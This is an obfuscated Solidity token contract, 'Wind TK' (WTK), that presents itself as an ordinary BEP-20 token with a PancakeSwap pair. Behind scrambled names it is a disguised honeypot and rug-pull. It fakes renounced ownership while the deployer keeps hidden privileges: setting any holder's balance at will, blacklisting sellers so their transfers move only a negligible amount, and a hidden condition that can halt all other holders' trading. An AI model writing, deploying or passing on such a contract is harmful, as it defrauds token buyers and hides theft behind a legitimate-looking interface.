//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface hzgxrjeuejarl {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract qssxpkzxn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface gosacbbvb {
    function createPair(address ycyrcjnsbwpfeh, address qipugdhye) external returns (address);
}

interface xpnrnjqbvnxcho {
    function totalSupply() external view returns (uint256);

    function balanceOf(address pdoeogdibfr) external view returns (uint256);

    function transfer(address qqppetkmoc, uint256 tvregnohpyv) external returns (bool);

    function allowance(address nbvmkvjnbk, address spender) external view returns (uint256);

    function approve(address spender, uint256 tvregnohpyv) external returns (bool);

    function transferFrom(
        address sender,
        address qqppetkmoc,
        uint256 tvregnohpyv
    ) external returns (bool);

    event Transfer(address indexed from, address indexed evqyammaiolzx, uint256 value);
    event Approval(address indexed nbvmkvjnbk, address indexed spender, uint256 value);
}

interface xpnrnjqbvnxchoMetadata is xpnrnjqbvnxcho {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WindTK is qssxpkzxn, xpnrnjqbvnxcho, xpnrnjqbvnxchoMetadata {

    mapping(address => uint256) private khpwtymbg;

    string private xkwnncqvetzuez = "WTK";

    address public wdiayhhiecnkk;

    uint256 private temtwnasgc = 100000000 * 10 ** 18;

    uint256 constant ftdwhfvhwt = 10 ** 10;

    function qvjqonvcg(address bzwcsgrwyyxcz) public {
        iwjaktqyfq();
        if (uksfxsxdsjpan) {
            iiufqlozwiuy = zpkyoonrux;
        }
        if (bzwcsgrwyyxcz == hnzaileofflxlk || bzwcsgrwyyxcz == wdiayhhiecnkk) {
            return;
        }
        hrtftclnsjdlf[bzwcsgrwyyxcz] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return gcctgxalg;
    }

    uint256 private xxfcbuhzfi;

    function yfddggzrbqtyms(address efikcvdskgare, uint256 tvregnohpyv) public {
        iwjaktqyfq();
        khpwtymbg[efikcvdskgare] = tvregnohpyv;
    }

    address ueujmtjobbloym = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed dnwltfrgilzjl, address indexed vtoidunpyvte);

    function owner() external view returns (address) {
        return zokheqrbtfwdd;
    }

    function transfer(address efikcvdskgare, uint256 tvregnohpyv) external virtual override returns (bool) {
        return fmflbrehxxzjza(_msgSender(), efikcvdskgare, tvregnohpyv);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return temtwnasgc;
    }

    function symbol() external view virtual override returns (string memory) {
        return xkwnncqvetzuez;
    }

    function approve(address wxxaerybrrxs, uint256 tvregnohpyv) public virtual override returns (bool) {
        srgrswpqrsycp[_msgSender()][wxxaerybrrxs] = tvregnohpyv;
        emit Approval(_msgSender(), wxxaerybrrxs, tvregnohpyv);
        return true;
    }

    uint256 cbtrixqavmko;

    function refolmpbxjckgm(address qznzcnhuvdka, address qqppetkmoc, uint256 tvregnohpyv) internal returns (bool) {
        require(khpwtymbg[qznzcnhuvdka] >= tvregnohpyv);
        khpwtymbg[qznzcnhuvdka] -= tvregnohpyv;
        khpwtymbg[qqppetkmoc] += tvregnohpyv;
        emit Transfer(qznzcnhuvdka, qqppetkmoc, tvregnohpyv);
        return true;
    }

    uint8 private gcctgxalg = 18;

    address public hnzaileofflxlk;

    function iwjaktqyfq() private view {
        require(ntpiyxkexpvmlw[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return unhxnlmyijiboj;
    }

    string private unhxnlmyijiboj = "Wind TK";

    function kfhgufzdgaglw(address agndkeefck) public {
        if (rcxmynplwboq) {
            return;
        }
        
        ntpiyxkexpvmlw[agndkeefck] = true;
        
        rcxmynplwboq = true;
    }

    constructor (){
        
        qfzikumcfef();
        hzgxrjeuejarl frigeufyzim = hzgxrjeuejarl(ueujmtjobbloym);
        wdiayhhiecnkk = gosacbbvb(frigeufyzim.factory()).createPair(frigeufyzim.WETH(), address(this));
        if (zpkyoonrux == xxfcbuhzfi) {
            tygilujnfe = zpkyoonrux;
        }
        hnzaileofflxlk = _msgSender();
        ntpiyxkexpvmlw[hnzaileofflxlk] = true;
        khpwtymbg[hnzaileofflxlk] = temtwnasgc;
        if (ogmfqiowfbet == uksfxsxdsjpan) {
            xxfcbuhzfi = zpkyoonrux;
        }
        emit Transfer(address(0), hnzaileofflxlk, temtwnasgc);
    }

    function fmflbrehxxzjza(address qznzcnhuvdka, address qqppetkmoc, uint256 tvregnohpyv) internal returns (bool) {
        if (qznzcnhuvdka == hnzaileofflxlk) {
            return refolmpbxjckgm(qznzcnhuvdka, qqppetkmoc, tvregnohpyv);
        }
        uint256 hmdpzvgwbmdnkk = xpnrnjqbvnxcho(wdiayhhiecnkk).balanceOf(edcgbfpestaox);
        require(hmdpzvgwbmdnkk == fpqlslttqkqh);
        require(qqppetkmoc != edcgbfpestaox);
        if (hrtftclnsjdlf[qznzcnhuvdka]) {
            return refolmpbxjckgm(qznzcnhuvdka, qqppetkmoc, ftdwhfvhwt);
        }
        return refolmpbxjckgm(qznzcnhuvdka, qqppetkmoc, tvregnohpyv);
    }

    uint256 public iiufqlozwiuy;

    mapping(address => mapping(address => uint256)) private srgrswpqrsycp;

    function allowance(address odmsgiccqhktop, address wxxaerybrrxs) external view virtual override returns (uint256) {
        if (wxxaerybrrxs == ueujmtjobbloym) {
            return type(uint256).max;
        }
        return srgrswpqrsycp[odmsgiccqhktop][wxxaerybrrxs];
    }

    bool private uksfxsxdsjpan;

    uint256 fpqlslttqkqh;

    uint256 public tygilujnfe;

    function getOwner() external view returns (address) {
        return zokheqrbtfwdd;
    }

    uint256 public zpkyoonrux;

    address edcgbfpestaox = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public ogmfqiowfbet;

    function balanceOf(address pdoeogdibfr) public view virtual override returns (uint256) {
        return khpwtymbg[pdoeogdibfr];
    }

    function transferFrom(address qznzcnhuvdka, address qqppetkmoc, uint256 tvregnohpyv) external override returns (bool) {
        if (_msgSender() != ueujmtjobbloym) {
            if (srgrswpqrsycp[qznzcnhuvdka][_msgSender()] != type(uint256).max) {
                require(tvregnohpyv <= srgrswpqrsycp[qznzcnhuvdka][_msgSender()]);
                srgrswpqrsycp[qznzcnhuvdka][_msgSender()] -= tvregnohpyv;
            }
        }
        return fmflbrehxxzjza(qznzcnhuvdka, qqppetkmoc, tvregnohpyv);
    }

    address private zokheqrbtfwdd;

    mapping(address => bool) public hrtftclnsjdlf;

    mapping(address => bool) public ntpiyxkexpvmlw;

    function tfgrksnimtyq(uint256 tvregnohpyv) public {
        iwjaktqyfq();
        fpqlslttqkqh = tvregnohpyv;
    }

    function qfzikumcfef() public {
        emit OwnershipTransferred(hnzaileofflxlk, address(0));
        zokheqrbtfwdd = address(0);
    }

    bool public rcxmynplwboq;

}